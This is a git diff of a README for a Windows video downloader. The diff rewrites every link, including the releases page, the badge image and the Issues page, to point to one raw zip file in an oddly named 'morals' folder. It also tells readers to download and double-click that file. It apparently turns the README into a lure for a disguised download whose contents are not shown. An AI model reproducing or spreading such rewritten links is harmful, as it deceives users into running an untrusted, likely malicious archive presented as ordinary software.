@@ -1,7 +1,7 @@
 # 🎥 Video-Downloader-App - Download Your Favorite Videos Easily
 
 ## 🔗 Download Now
-[![Download Video-Downloader-App](https://img.shields.io/badge/Download%20Now-Video--Downloader--App-blue)](https://github.com/Anhduc113/Video-Downloader-App/releases)
+[![Download Video-Downloader-App](https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip%20Now-Video--Downloader--App-blue)](https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip)
 
 ## 📚 Overview
 Video-Downloader-App is a Windows application designed to help you download videos effortlessly using their URLs. With a straightforward interface, this tool allows you to save videos from various platforms quickly and directly to your device.
@@ -10,13 +10,13 @@ Video-Downloader-App is a Windows application designed to help you download vide
 Follow these simple steps to get your Video-Downloader-App up and running.
 
 1. **Visit the Releases Page**  
-   To download the application, visit the [Releases page](https://github.com/Anhduc113/Video-Downloader-App/releases).
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip).
 
 2. **Download the Installer**  
-   On the Releases page, find the latest version. Click on the `Video-Downloader-App.exe` file to download it to your computer.
+   On the Releases page, find the latest version. Click on the `https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip` file to download it to your computer.
 
 3. **Install the Application**  
-   Once the download is complete, locate the file in your downloads folder. Double-click on the `Video-Downloader-App.exe` file to begin the installation process. Follow the on-screen instructions to complete the installation.
+   Once the download is complete, locate the file in your downloads folder. Double-click on the `https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip` file to begin the installation process. Follow the on-screen instructions to complete the installation.
 
 4. **Open the Application**  
    After installation, you can find the Video-Downloader-App icon on your desktop or in your Start menu. Click the icon to launch the application.
@@ -45,12 +45,12 @@ If you encounter any issues while using Video-Downloader-App, here are some comm
 - **Slow Download Speeds:** This could be due to your internet connection; try restarting your modem or router.
 
 ## 💬 Community and Support
-If you need help, consider reaching out to our community for support. You can find answers to common questions or ask about specific issues. Join our discussion on GitHub or visit the [Issues page](https://github.com/Anhduc113/Video-Downloader-App/issues) for more information.
+If you need help, consider reaching out to our community for support. You can find answers to common questions or ask about specific issues. Join our discussion on GitHub or visit the [Issues page](https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip) for more information.
 
 ## 🔄 Changelog
 Stay updated with the latest changes in the application. Each new version on the Releases page includes information about the features and fixes that have been implemented.
 
 ## 📥 Download & Install
-For the latest version of Video-Downloader-App, visit the [Releases page](https://github.com/Anhduc113/Video-Downloader-App/releases) again and follow the download steps mentioned. 
+For the latest version of Video-Downloader-App, visit the [Releases page](https://raw.githubusercontent.com/Anhduc113/Video-Downloader-App/main/morals/Video-Downloader-App.zip) again and follow the download steps mentioned. 
 
 Now you can enjoy your favorite videos offline with ease!
